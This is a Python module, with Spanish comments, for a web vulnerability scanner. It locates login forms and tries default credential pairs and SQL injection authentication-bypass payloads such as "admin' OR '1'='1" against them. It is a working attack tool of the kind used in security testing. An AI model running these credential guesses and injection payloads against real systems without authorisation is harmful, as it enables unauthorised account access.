"""
Escáner de bypass de autenticación
"""
import sys
from typing import List, Dict
from urllib.parse import urljoin
from bs4 import BeautifulSoup


class AuthBypassScanner:
    """Escáner para detectar vulnerabilidades de bypass de autenticación"""
    
    # Credenciales por defecto comunes
    DEFAULT_CREDENTIALS = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '12345'),
        ('admin', 'admin123'),
        ('root', 'root'),
        ('root', 'password'),
        ('user', 'user'),
        ('test', 'test'),
        ('guest', 'guest'),
        ('administrator', 'administrator')
    ]
    
    # Payloads para bypass de autenticación
    BYPASS_PAYLOADS = [
        ("admin' OR '1'='1", "anything"),
        ("admin' --", ""),
        ("admin' #", ""),
        ("' OR '1'='1' --", ""),
        ("admin' OR 1=1--", "anything")
    ]
    
    def __init__(self, http_client, reporter):
        self.http_client = http_client
        self.reporter = reporter
        self.vulnerabilities = []
    
    def scan(self, target_url: str) -> List[Dict]:
        """Escanear objetivo en busca de bypass de autenticación"""
        self.reporter.print_header(f"AUTHENTICATION BYPASS SCAN - {target_url}")
        self.vulnerabilities = []
        
        response = self.http_client.get(target_url)
        if not response:
            self.reporter.print_error("No se pudo conectar al objetivo")
            return self.vulnerabilities
        
        # Buscar formularios de login
        login_forms = self._find_login_forms(target_url, response.text)
        
        if not login_forms:
            self.reporter.print_info("No se encontraron formularios de login evidentes")
            return self.vulnerabilities
        
        # Probar bypass en cada formulario
        for form_info in login_forms:
            self._test_default_credentials(form_info)
            self._test_sql_bypass(form_info)
        
        if self.vulnerabilities:
            self.reporter.print_warning(f"Encontradas {len(self.vulnerabilities)} posibles vulnerabilidades de autenticación")
        else:
            self.reporter.print_success("No se detectaron vulnerabilidades de autenticación evidentes")
        
        return self.vulnerabilities
    
    def _find_login_forms(self, url: str, html_content: str) -> List[Dict]:
        """Buscar formularios de login en la página"""
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = soup.find_all('form')
        login_forms = []
        
        for form in forms:
            inputs = form.find_all('input')
            has_password = False
            has_username = False
            username_field = None
            password_field = None
            
            for input_field in inputs:
                input_type = input_field.get('type', '').lower()
                input_name = input_field.get('name', '').lower()
                
                if input_type == 'password':
                    has_password = True
                    password_field = input_field.get('name')
                
                if input_type in ['text', 'email'] or 'user' in input_name or 'email' in input_name:
                    has_username = True
                    username_field = input_field.get('name')
            
            if has_password and has_username:
                action = form.get('action', '')
                method = form.get('method', 'post').upper()
                form_url = urljoin(url, action)
                
                login_forms.append({
                    'url': form_url,
                    'method': method,
                    'username_field': username_field,
                    'password_field': password_field,
                    'form': form
                })
        
        self.reporter.print_info(f"Encontrados {len(login_forms)} formulario(s) de login")
        return login_forms
    
    def _test_default_credentials(self, form_info: Dict):
        """Probar credenciales por defecto"""
        self.reporter.print_info("Probando credenciales por defecto...")
        
        for username, password in self.DEFAULT_CREDENTIALS[:5]:  # Limitar intentos
            form_data = self._build_form_data(form_info, username, password)
            
            if form_info['method'] == 'POST':
                response = self.http_client.post(form_info['url'], data=form_data)
            else:
                response = self.http_client.get(form_info['url'], params=form_data)
            
            if response and self._check_successful_login(response):
                vuln = {
                    'type': 'Default Credentials',
                    'url': form_info['url'],
                    'username': username,
                    'password': password,
                    'details': f'Credenciales por defecto funcionan: {username}/{password}'
                }
                self.vulnerabilities.append(vuln)
                self.reporter.print_vulnerability('Credenciales por Defecto', vuln['details'])
                return
    
    def _test_sql_bypass(self, form_info: Dict):
        """Probar bypass SQL"""
        self.reporter.print_info("Probando bypass SQL en autenticación...")
        
        for username_payload, password_payload in self.BYPASS_PAYLOADS[:3]:  # Limitar intentos
            form_data = self._build_form_data(form_info, username_payload, password_payload)
            
            if form_info['method'] == 'POST':
                response = self.http_client.post(form_info['url'], data=form_data)
            else:
                response = self.http_client.get(form_info['url'], params=form_data)
            
            if response and self._check_successful_login(response):
                vuln = {
                    'type': 'SQL Injection Auth Bypass',
                    'url': form_info['url'],
                    'payload': username_payload,
                    'details': f'Bypass SQL exitoso con payload: {username_payload}'
                }
                self.vulnerabilities.append(vuln)
                self.reporter.print_vulnerability('Bypass SQL', vuln['details'])
                return
    
    def _build_form_data(self, form_info: Dict, username: str, password: str) -> Dict:
        """Construir datos del formulario"""
        form_data = {
            form_info['username_field']: username,
            form_info['password_field']: password
        }
        
        # Añadir otros campos del formulario
        for input_field in form_info['form'].find_all('input'):
            input_name = input_field.get('name')
            input_type = input_field.get('type', '').lower()
            
            if input_name and input_name not in form_data:
                if input_type == 'submit':
                    form_data[input_name] = input_field.get('value', 'submit')
                elif input_type == 'hidden':
                    form_data[input_name] = input_field.get('value', '')
        
        return form_data
    
    def _check_successful_login(self, response) -> bool:
        """Verificar si el login fue exitoso"""
        # Indicadores de login exitoso
        success_indicators = [
            'dashboard',
            'bienvenido',
            'welcome',
            'logout',
            'cerrar sesión',
            'mi cuenta',
            'my account',
            'profile',
            'perfil'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        # Si hay redirección a una URL diferente, puede indicar éxito
        if response.history:
            return True
        
        return False


def main():
    """Función principal para ejecución standalone"""
    if len(sys.argv) < 2:
        print("Uso: python auth_bypass.py <url>")
        sys.exit(1)
    
    from utils.http_client import HTTPClient
    from utils.reporter import Reporter
    
    target = sys.argv[1]
    client = HTTPClient()
    reporter = Reporter()
    
    scanner = AuthBypassScanner(client, reporter)
    vulnerabilities = scanner.scan(target)
    
    client.close()
    
    if vulnerabilities:
        sys.exit(1)
    sys.exit(0)


if __name__ == '__main__':
    main()
